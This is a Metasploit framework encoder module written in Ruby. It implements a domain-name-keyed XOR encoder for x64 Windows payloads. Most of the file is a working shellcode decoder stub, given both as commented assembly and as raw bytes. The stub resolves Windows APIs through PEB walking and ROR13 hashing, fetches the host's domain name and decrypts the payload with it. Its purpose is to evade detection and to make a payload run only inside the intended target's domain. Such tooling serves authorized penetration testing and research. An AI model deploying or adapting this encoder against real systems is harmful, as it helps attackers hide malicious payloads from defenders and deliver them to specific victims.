##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::Xor

  def initialize
    super(
      'Name'             => 'Domainname-based Context Keyed Payload Encoder',
      'Description'      => 'Context-Keyed Payload Encoder based on Domainname and x64 XOR encoder.  Uses an 8 byte key.  So far only tested on Windows 7 x64.',
      'Author'           => [ 'sf' 'oso', 'jwe' ],
      'Arch'             => ARCH_X64,
      'License'          => MSF_LICENSE,
      'Platform'         => 'windows',
      'Decoder'          =>
        {
          'KeySize'      => 8,
          'KeyPack'      => 'Q',
          'BlockSize'    => 8
        }
      )

    register_options([ OptString.new('C_DOMAINNAME',[ true, "Context Domainname.", "domainname"])])
  end

  def obtain_key(buf, badchars, state)
    # TODO: Currently only first 8 chars are taken as key. We should include the other chars in the key.
    state.key = datastore['C_DOMAINNAME'][0..8].reverse!.unpack('H*')[0].to_i(base=16)
  end

  def decoder_stub( state )
    # calculate the (negative) block count. We should check this against state.badchars.
    block_count = [-( ( (state.buf.length - 1) / state.decoder_key_size) + 1)].pack( "V" )

    # ; Sources: http://mcdermottcybersecurity.com/articles/windows-x64-shellcode and https://www.tophertimzen.com/blog/windowsx64Shellcode/
    # BITS 64
    # section .text
    # global start
    #
    # start:
    #     ; Get kernel32.dll base address
    #     mov r12, [gs:0x60] ; PEB
    #     mov r12, [r12 + 0x18] ; PEB->Ldr
    #     mov r12, [r12 + 0x20] ; PEB->Ldr.InMemoryOrderModuleList
    #     mov r12, [r12] ; First entry
    #     mov r15, [r12 + 0x20] ; ntdll.dll base address
    #     mov r12, [r12] ; Second entry
    #     mov r12, [r12 + 0x20] ; kernel32.dll base address
    #
    #     ; Find address of LoadLibraryA
    #     mov rcx, r12 ; hModule = kernel32.dll base address
    #     mov rdx, 0xec0e4e8e ; lpProcName = rot13(LoadLibraryA)
    #     call GetProcAddress
    #
    #     ; Load LibraryA(netapi32.dll)
    #     jmp short getNetapi32 ; Jump to the location of the command string
    # returnGetNetapi32: ; Define a label so that string address is pushed on the stack
    #     pop rbx ; RBX now points to the string
    #     mov rcx, rbx ; Library name is first parameter (RCX)
    #     call rax ; Call LoadLibraryA(path)
    #
    #     ; Find address of GetProcAddress
    #     push rax ; Push RAX to stack
    #     mov rcx, r12 ; hModule = kernel32.dll base address
    #     mov rdx, 0x7c0dfcaa ; lpProcName = rot13(GetProcAddress)
    #     call GetProcAddress
    #
    #     ; GetProcess(netapi32.dll, "DsRoleGetPrimaryDomainInformation")
    #     jmp short getPrimaryDomainInformation
    # returnGetPrimaryDomainInformation:
    #     pop rbx ; RBX now points to the function name
    #     pop rcx ; hModule = netapi32.dll base address from stack
    #     mov rdx, rbx ; RDX = "DsRoleGetPrimaryDomainInformation"
    #     call rax ; Call GetProcAddress(netapi32.dll, "DsRoleGetPrimaryDomainInformation")
    #
    #     ; DsRoleGetPrimaryDomainInformation(0, 1, *buffer)
    #     mov rbx, rax ; RBX = Address of netapi32.dll:DsRoleGetPrimaryDomainInformation
    #     xor rcx, rcx ; RCX = 0 (lpServer)
    #     xor rdx, rdx ; RDX = 0
    #     inc rdx ; RDX = 1 (InfoLevel = DsRolePrimaryDomainInfoBasic)
    #     lea r8, [rsp + 0x24] ; R8 = Create space for _DSROLE_PRIMARY_DOMAIN_INFO_BASIC struct (*buffer)
    #     call rbx ; Call DsRoleGetPrimaryDomainInformation(0, 1, *buffer)
    #
    #     ; Manually store DomainNameDNS in RBX and convert from wide string to narrow string in the process
    #     mov rax, [rsp + 0x24]
    #     xor rbx, rbx
    #     mov bl, [rax + 0x4e]
    #     shl rbx, 8
    #     mov bl, [rax + 0x4c]
    #     shl rbx, 8
    #     mov bl, [rax + 0x4a]
    #     shl rbx, 8
    #     mov bl, [rax + 0x48]
    #     shl rbx, 8
    #     mov bl, [rax + 0x46]
    #     shl rbx, 8
    #     mov bl, [rax + 0x44]
    #     shl rbx, 8
    #     mov bl, [rax + 0x42]
    #     shl rbx, 8
    #     mov bl, [rax + 0x40]
    #     jmp done
    #
    # ; Helper strings and functions
    #     jmp done
    #
    # ; Helper strings and functions
    # getNetapi32:
    #     call returnGetNetapi32
    #     db "netapi32.dll"
    #     db 0x00
    #
    # getPrimaryDomainInformation:
    #     call returnGetPrimaryDomainInformation
    #     db "DsRoleGetPrimaryDomainInformation"
    #     db 0x00
    #
    # GetProcAddress:
    #     mov r13, rcx ; Base address of DLL loaded
    #     mov eax, [r13d + 0x3c] ; Skip DOS header and go to PE header
    #     mov r14d, [r13d + eax + 0x88] ; Export table in PE header
    #     add r14d, r13d ; R14D = Absolute base address for export table
    #     mov r10d, [r14d + 0x18] ; Go into export table and get the numberOfNames
    #     mov ebx, [r14d + 0x20] ; EBX = AddressOfNames offset
    #     add ebx, r13d ; EBX = AddressOfNames base
    # findFunctionLoop:
    #     jecxz findFunctionFinished ; ECX == 0 means nothing found
    #     dec r10d ; Decrease by one until match is found
    #     mov esi, [ebx + r10d * 4] ; Get name
    #     add esi, r13d ; ESI = Current name
    # findHashes:
    #     xor edi, edi
    #     xor eax, eax
    #     cld
    # continueHashing:
    #     lodsb ; Get into AL from ESI
    #     test al, al ; Is the end of the string reached?
    #     jz computeHashFinished
    #     ror edi, 0xd ; ROR13 hash calculation
    #     add edi, eax
    #     jmp continueHashing
    # computeHashFinished:
    #     cmp edi, edx ; EDX has the function hash
    #     jnz findFunctionLoop ; Didn't match, try harder!
    #     mov ebx, [r14d + 0x24] ; Put the address of the ordinal table and put it in EBX
    #     add ebx, r13d ; EBX = Absolute address
    #     xor ecx, ecx ; ECX = 0
    #     mov cx, [ebx + 2 * r10d] ; Each ordinal is two bytes
    #     mov ebx, [r14d + 0x1c] ; Extract address table offset
    #     add ebx, r13d ; EBX = Absolute address
    #     mov eax, [ebx + 4 * ecx] ; EAX = Relative address
    #     add eax, r13d
    # findFunctionFinished:
    #     ret
    #
    # ; All done, continue with your own code here.  Remember that the DomainNameDNS is referenced in RBX!
    # done:

    # TODO: Optimize
    decoder = "" +
        "\x65\x4C\x8B\x24\x25\x60\x00\x00\x00\x4D\x8B\x64\x24\x18\x4D\x8B\x64\x24\x20\x4D\x8B\x24\x24\x4D\x8B\x7C\x24\x20\x4D\x8B\x24\x24\x4D\x8B\x64\x24\x20\x4C\x89\xE1\xBA\x8E\x4E\x0E\xEC\xE8\xB1\x00\x00\x00\xEB\x76\x5B\x48\x89\xD9\xFF\xD0\x50\x4C\x89\xE1\xBA\xAA\xFC\x0D\x7C\xE8\x9B\x00\x00\x00\xEB\x72\x5B\x59\x48\x89\xDA\xFF\xD0\x48\x89\xC3\x48\x31\xC9\x48\x31\xD2\x48\xFF\xC2\x4C\x8D\x44\x24\x24\xFF\xD3\x48\x8B\x44\x24\x24\x48\x31\xDB\x8A\x58\x4E\x48\xC1\xE3\x08\x8A\x58\x4C\x48\xC1\xE3\x08\x8A\x58\x4A\x48\xC1\xE3\x08\x8A\x58\x48\x48\xC1\xE3\x08\x8A\x58\x46\x48\xC1\xE3\x08\x8A\x58\x44\x48\xC1\xE3\x08\x8A\x58\x42\x48\xC1\xE3\x08\x8A\x58\x40\xE9\xA2\x00\x00\x00\xE9\x9D\x00\x00\x00\xE8\x85\xFF\xFF\xFF\x6E\x65\x74\x61\x70\x69\x33\x32\x2E\x64\x6C\x6C\x00\xE8\x89\xFF\xFF\xFF\x44\x73\x52\x6F\x6C\x65\x47\x65\x74\x50\x72\x69\x6D\x61\x72\x79\x44\x6F\x6D\x61\x69\x6E\x49\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x00\x49\x89\xCD\x67\x41\x8B\x45\x3C\x67\x45\x8B\xB4\x05\x88\x00\x00\x00\x45\x01\xEE\x67\x45\x8B\x56\x18\x67\x41\x8B\x5E\x20\x44\x01\xEB\x67\xE3\x3F\x41\xFF\xCA\x67\x42\x8B\x34\x93\x44\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF4\x39\xD7\x75\xDD\x67\x41\x8B\x5E\x24\x44\x01\xEB\x31\xC9\x66\x67\x42\x8B\x0C\x53\x67\x41\x8B\x5E\x1C\x44\x01\xEB\x67\x8B\x04\x8B\x44\x01\xE8\xC3" +

        # loop
        "\x48\x31\xC9" +                  # xor rcx, rcx
        "\x48\x81\xE9" + block_count +    # sub ecx, block_count
        "\x48\x8D\x05\xEF\xFF\xFF\xFF" +  # lea rax, [rip - 0x01]
        "\x48\x31\x58\x1d" +              # xor [rax+0x1d], rbx
        "\x48\x2D\xF8\xFF\xFF\xFF" +      # sub rax, -8
        "\xE2\xF4"                        # loop 0x1B
    return decoder
  end
end
